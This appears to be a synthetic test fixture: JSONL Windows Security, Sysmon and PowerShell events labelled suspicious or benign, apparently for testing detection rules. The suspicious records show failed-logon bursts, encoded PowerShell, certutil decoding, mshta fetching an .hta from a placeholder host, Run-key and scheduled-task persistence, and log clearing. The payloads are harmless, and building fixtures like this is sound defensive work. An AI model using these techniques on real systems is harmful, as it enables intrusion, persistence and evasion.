{"timestamp": "2026-09-01T09:00:00Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4625, "record_id": 1000, "event_data": {"TargetUserName": "analyst.lab", "TargetDomainName": "LAB", "IpAddress": "192.0.2.25", "LogonType": "3", "Status": "0xc000006d", "SubStatus": "0xc000006a"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:00:20Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4625, "record_id": 1001, "event_data": {"TargetUserName": "analyst.lab", "TargetDomainName": "LAB", "IpAddress": "192.0.2.25", "LogonType": "3", "Status": "0xc000006d", "SubStatus": "0xc000006a"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:00:40Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4625, "record_id": 1002, "event_data": {"TargetUserName": "analyst.lab", "TargetDomainName": "LAB", "IpAddress": "192.0.2.25", "LogonType": "3", "Status": "0xc000006d", "SubStatus": "0xc000006a"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:01:00Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4625, "record_id": 1003, "event_data": {"TargetUserName": "analyst.lab", "TargetDomainName": "LAB", "IpAddress": "192.0.2.25", "LogonType": "3", "Status": "0xc000006d", "SubStatus": "0xc000006a"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:01:20Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4625, "record_id": 1004, "event_data": {"TargetUserName": "analyst.lab", "TargetDomainName": "LAB", "IpAddress": "192.0.2.25", "LogonType": "3", "Status": "0xc000006d", "SubStatus": "0xc000006a"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:01:50Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4624, "record_id": 1005, "event_data": {"TargetUserName": "analyst.lab", "TargetDomainName": "LAB", "IpAddress": "192.0.2.25", "LogonType": "3"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:02:00Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "record_id": 1006, "event_data": {"Image": "C:\\Windows\\explorer.exe", "CommandLine": "explorer.exe", "ProcessGuid": "{DEMO-PARENT}", "ParentProcessGuid": "{OUTSIDE-CAPTURE}", "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\analyst.lab"}, "fixture_label": "synthetic_benign", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:02:10Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "record_id": 1007, "event_data": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACcA", "ProcessGuid": "{DEMO-PS}", "ParentProcessGuid": "{DEMO-PARENT}", "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\analyst.lab"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:02:11Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-PowerShell/Operational", "provider": "Microsoft-Windows-PowerShell", "event_id": 4104, "record_id": 1008, "event_data": {"ScriptBlockText": "Write-Output 'lab'", "ScriptBlockId": "demo-script"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:02:20Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 3, "record_id": 1009, "event_data": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{DEMO-PS}", "DestinationIp": "192.0.2.50", "DestinationPort": "8080", "Protocol": "tcp"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:02:30Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "record_id": 1010, "event_data": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -decode C:\\Lab\\input.txt C:\\Lab\\output.txt", "ProcessGuid": "{DEMO-CERT}", "ParentProcessGuid": "{DEMO-PARENT}", "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\analyst.lab"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:02:40Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "record_id": 1011, "event_data": {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe https://example.invalid/lab.hta", "ProcessGuid": "{DEMO-HTA}", "ParentProcessGuid": "{DEMO-PARENT}", "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\analyst.lab"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:02:50Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4698, "record_id": 1012, "event_data": {"SubjectUserName": "analyst.lab", "TaskName": "\\Lab\\ReviewTask", "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-File C:\\Lab\\review.ps1</Arguments></Exec></Actions></Task>"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:03:00Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 13, "record_id": 1013, "event_data": {"Image": "C:\\Windows\\System32\\reg.exe", "ProcessGuid": "{DEMO-REG}", "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LabReview", "Details": "powershell.exe -File C:\\Lab\\review.ps1"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:03:10Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Eventlog", "event_id": 1102, "record_id": 1014, "event_data": {"SubjectUserName": "analyst.lab", "SubjectDomainName": "LAB"}, "fixture_label": "synthetic_suspicious", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:03:20Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "record_id": 1015, "event_data": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Lab\\backup.ps1", "ProcessGuid": "{DEMO-BACKUP}", "ParentProcessGuid": "{DEMO-PARENT}", "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\analyst.lab"}, "fixture_label": "synthetic_benign_alert_expected", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:03:30Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "record_id": 1016, "event_data": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -File C:\\Lab\\inventory.ps1", "ProcessGuid": "{DEMO-INVENTORY}", "ParentProcessGuid": "{DEMO-PARENT}", "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\analyst.lab"}, "fixture_label": "synthetic_benign", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:03:40Z", "host": "WS-LAB-01", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_id": 4698, "record_id": 1017, "event_data": {"SubjectUserName": "admin.lab", "TaskName": "\\Lab\\Backup", "TaskContent": "<Task><Actions><Exec><Command>C:\\Lab\\backup.exe</Command></Exec></Actions></Task>"}, "fixture_label": "synthetic_benign", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
{"timestamp": "2026-09-01T09:03:50Z", "host": "WS-LAB-01", "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon", "event_id": 13, "record_id": 1018, "event_data": {"TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LabApp", "Details": "C:\\Lab\\app.exe"}, "fixture_label": "synthetic_benign", "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"}}
